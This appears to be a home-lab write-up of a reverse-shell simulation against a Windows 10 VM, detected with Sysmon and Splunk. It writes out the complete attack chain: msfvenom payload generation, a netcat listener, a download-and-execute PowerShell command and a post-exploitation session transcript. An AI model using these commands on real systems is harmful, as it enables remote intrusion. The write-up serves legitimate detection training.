# 🛠️ Reverse Shell via Executable Payload

## 📋 Overview
In this attack simulation, a reverse shell was established by executing a malicious .exe payload generated using msfvenom. The attacker gained interactive access to the victim Windows machine through a simple TCP connection.


## ⚙️ Attack Details
Attacker (Kali)
- IP: 192.168.0.11
- Tool: msfvenom, nc (Netcat)

Victim (Windows 10)
- IP: 192.168.0.12
- Role: Windows endpoint target


## 🧱 Commands Used
Kali Linux (Attacker)

    # Generate the payload
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.11 LPORT=4444 -f exe > shell.exe

    # Start listener
    nc -lvnp 4444

    # Create webserver
    python3 -m http.server 8000
<details>
<summary>🖼️ Payload, netcat, server</summary>

![Screenshot 2025-04-27 133221](https://github.com/user-attachments/assets/0e1fc79a-c9c2-4f70-bc65-dfdec1f1efb1)

</details>


Windows 10 (Victim)
``` powershell
# Download the payload
Invoke-WebRequest -Uri http://192.168.0.11:8000/shell.exe -OutFile shell.exe
# Execute the payload
.\shell.exe
```
<details>
<summary>🖼️ Download and execute payload</summary>

![Screenshot 2025-04-27 133506](https://github.com/user-attachments/assets/cfaf92f9-c747-4e47-a339-94918275735e)

</details>


## 🔍 Detection in Splunk
✅ Process Creation Event (EventCode=1) captured in Splunk:
- Image: C:\Users\vboxuser\Desktop\shell.exe
- User: victim-win\vboxuser
- Parent Process: powershell.exe
- Source: Microsoft-Windows-Sysmon/Operational
- IntegrityLevel: High
- CommandLine: "C:\Users\vboxuser\Desktop\shell.exe"
- Hashes: [MD5, SHA256, IMPHASH]
<details>
<summary>🖼️ Network Connection event</summary>

![Screenshot 2025-04-27 133823](https://github.com/user-attachments/assets/97db5991-370c-4704-8677-2817a1654904)

</details>

<details>
<summary>🖼️ Process Creation event</summary>

![Screenshot 2025-04-27 134017](https://github.com/user-attachments/assets/ab216fcf-1c0d-4fa7-8217-a2c4ba1c1056)

</details>


## 🔥 Outcome
- A reverse TCP shell was successfully established.
  <details>
  <summary>🖼️ Reverse TCP connection</summary>

  ![Screenshot 2025-04-27 133508](https://github.com/user-attachments/assets/9e29afd2-dd68-4aeb-943d-b631dc2a84f5)

  </details>

- The attacker achieved interactive command execution on the victim.
  <details>
  <summary>🖼️ Interactive command execution</summary>

  ![Screenshot 2025-04-27 143520](https://github.com/user-attachments/assets/434f1992-5589-44d7-bf22-8458d5c6b37c)

  </details>
  <details><summary>📜 View Session Transcript</summary>

      listening on [any] 4444 ...
      connect to [192.168.0.11] from (UNKNOWN) [192.168.0.12] 51716
      Microsoft Windows [Version 10.0.19045.3930]
      (c) Microsoft Corporation. All rights reserved.

      C:\Users\vboxuser>whoami
      victim-win\vboxuser

      C:\Users\vboxuser>hostname
      VICTIM-WIN

      C:\Users\vboxuser>ipconfig
      Windows IP Configuration

      Ethernet adapter Ethernet:
         IPv4 Address. . . . . . . . . . . : 10.0.2.15
      Ethernet adapter Ethernet 2:
         IPv4 Address. . . . . . . . . . . : 192.168.0.12

      C:\Users\vboxuser>systeminfo
      Host Name:                 VICTIM-WIN
      OS Name:                   Microsoft Windows 10 Enterprise Evaluation
      OS Version:                10.0.19045 N/A Build 19045
      System Manufacturer:       innotek GmbH
      System Model:              VirtualBox

  </details>

- The activity was detected and logged by Sysmon and visualized through Splunk.


## 📌 Notes
This demonstrates the importance of process monitoring, parent-child relationship analysis, and hash-based detection in catching early-stage attacks.
